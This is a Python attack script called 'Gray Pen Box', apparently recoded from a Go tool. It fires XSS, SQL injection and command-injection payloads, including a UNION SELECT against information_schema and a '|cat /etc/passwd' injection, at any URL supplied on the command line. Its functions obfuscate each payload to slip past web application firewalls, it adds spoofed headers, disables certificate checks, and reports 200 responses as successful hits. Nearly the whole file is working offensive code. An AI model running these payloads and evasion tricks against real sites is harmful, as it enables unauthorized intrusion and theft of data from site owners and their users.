#!/usr/bin/env python3
"""

  ▄████  ██▀███   ▄▄▄     ▓██   ██▓    ██▓███  ▓█████  ███▄    █     ▄▄▄▄    ▒█████  ▒██   ██▒
 ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▒██  ██▒   ▓██░  ██▒▓█   ▀  ██ ▀█   █    ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░
▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄   ▒██ ██░   ▓██░ ██▓▒▒███   ▓██  ▀█ ██▒   ▒██▒ ▄██▒██░  ██▒░░  █   ░
░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██  ░ ▐██▓░   ▒██▄█▓▒ ▒▒▓█  ▄ ▓██▒  ▐▌██▒   ▒██░█▀  ▒██   ██░ ░ █ █ ▒ 
░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒ ░ ██▒▓░   ▒██▒ ░  ░░▒████▒▒██░   ▓██░   ░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒
 ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ██▒▒▒    ▒▓▒░ ░  ░░░ ▒░ ░░ ▒░   ▒ ▒    ░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▓██ ░▒░    ░▒ ░      ░ ░  ░░ ░░   ░ ▒░   ▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░
░ ░   ░   ░░   ░   ░   ▒   ▒ ▒ ░░     ░░          ░      ░   ░ ░     ░    ░ ░ ░ ░ ▒   ░    ░  
      ░    ░           ░  ░░ ░                    ░  ░         ░     ░          ░ ░   ░    ░  
                           ░ ░                                            ░                   


Original Author: vulntechx (GO Language)
Recoded by: Subir (Gray Code) - Python Edition
"""

import random
import urllib.parse
import re
import json
import argparse
import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class BloodyPenBox:
    def __init__(self):
        self.techniques = [
            self.bloody_unicode,
            self.bloody_case_mangle,
            self.bloody_comments,
            self.bloody_null_terminate,
            self.bloody_parameter_pollute,
            self.bloody_json_obfuscate,
            self.bloody_xml_obfuscate,
            self.bloody_space_fuzz
        ]
        
        self.payloads = {
            'xss': [
                "\"><script>alert('BLOOD')</script>",
                "javascript:alert('BLOOD')",
                "onmouseover=alert('BLOOD')",
                "eval(String.fromCharCode(98,108,111,111,100))"
            ],
            'sqli': [
                "' OR 'blood'='blood'--",
                "' UNION SELECT 'blood',table_name FROM information_schema.tables--",
                "1 AND (SELECT 'blood' FROM pg_sleep(5))--"
            ],
            'rce': [
                ";echo 'blood'",
                "|cat /etc/passwd#blood",
                "`echo blood`"
            ]
        }

    # Bloody Codes
    def bloody_unicode(self, payload):
        """Bloody unicode obfuscation"""
        blood_map = {
            'a': ['%61', '%E1'],
            'b': ['%62', '%E2'],
            'l': ['%6C', '%EE'],
            'o': ['%6F', '%F6'],
            'd': ['%64', '%E4']
        }
        for char, codes in blood_map.items():
            payload = payload.replace(char, random.choice(codes))
        return payload

    def bloody_case_mangle(self, payload):
        """Random bloody case switching"""
        return ''.join(
            random.choice([c.upper(), c.lower()]) 
            if c.isalpha() else c 
            for c in payload
        )

    def bloody_comments(self, payload):
        """Insert bloody comments"""
        bloody_comments = ['/*BLOOD*/', '/*!BLOOD*/', '/**/BLOOD/**/']
        return random.choice(bloody_comments) + payload + random.choice(bloody_comments)

    def bloody_null_terminate(self, payload):
        """Add bloody null terminators"""
        bloody_terminators = ['%00BLOOD', '%0ABLOOD', '%0DBLOOD']
        return payload + random.choice(bloody_terminators)

    def bloody_parameter_pollute(self, payload):
        """Bloody parameter pollution"""
        if '=' in payload:
            return payload + "&blood=1"
        return payload

    def bloody_json_obfuscate(self, payload):
        """Bloody JSON wrapping"""
        return '{"blood":"' + payload + '"}'

    def bloody_xml_obfuscate(self, payload):
        """Bloody XML attributes"""
        return payload.replace("=", " BLOOD= ")

    def bloody_space_fuzz(self, payload):
        """Bloody space fuzzing"""
        return payload.replace(" ", random.choice(['%20BLOOD', '%09BLOOD', '%0ABLOOD']))

    def bloody_headers(self):
        """Generate bloody headers"""
        return {
            'X-Bloody-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.0.1",
            'User-Agent': 'BloodyBrowser/1.0',
            'Accept': 'text/blood,application/blood',
            'Cookie': 'blood=1'
        }

    def make_it_bleed(self, payload):
        """Apply bloody transformations"""
        for technique in random.sample(self.techniques, 3):
            payload = technique(payload)
        return payload, self.bloody_headers()

    def bleed_on_target(self, url, vuln_type='xss'):
        """Make target bleed"""
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
            
        results = []
        for payload in self.payloads[vuln_type]:
            bloody_payload, headers = self.make_it_bleed(payload)
            try:
                r = requests.get(
                    url,
                    params={'bleed': bloody_payload},
                    headers=headers,
                    timeout=7,
                    verify=False
                )
                results.append({
                    'payload': payload,
                    'bypassed': bloody_payload,
                    'status': r.status_code,
                    'length': len(r.text),
                    'headers': headers
                })
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e)
                })
        return results

def show_bloody_results(results):
    """Display bloody results"""
    print("\n\033[91m" + "═"*60 + "\033[0m")
    for result in results:
        print("\n\033[91m[ BLOODY TEST ]\033[0m")
        print(f"\033[93mOriginal: \033[91m{result['payload']}\033[0m")
        
        if 'error' in result:
            print(f"\033[91mERROR: {result['error']}\033[0m")
            continue
            
        print(f"\033[93mBypassed: \033[91m{result['bypassed']}\033[0m")
        print(f"\033[93mStatus: \033[91m{result['status']}\033[0m")
        if result['status'] == 200:
            print("\033[91m[!] TARGET IS BLEEDING!\033[0m")
        print("\033[91m" + "─"*40 + "\033[0m")

if __name__ == "__main__":
    print(__doc__)  #My banner
    
    parser = argparse.ArgumentParser(description="\033[91mGray Pen Box - Make Targets Bleed\033[0m")
    parser.add_argument("target", help="Target URL to make bleed")
    parser.add_argument("-t", "--type", choices=['xss', 'sqli', 'rce'], default='xss',
                      help="Type of attack (default: xss)")
    args = parser.parse_args()

    pen = BloodyPenBox()
    print(f"\n\033[91m[+] Making {args.target} bleed with {args.type.upper()}...\033[0m")
    
    bloody_results = pen.bleed_on_target(args.target, args.type)
    show_bloody_results(bloody_results)
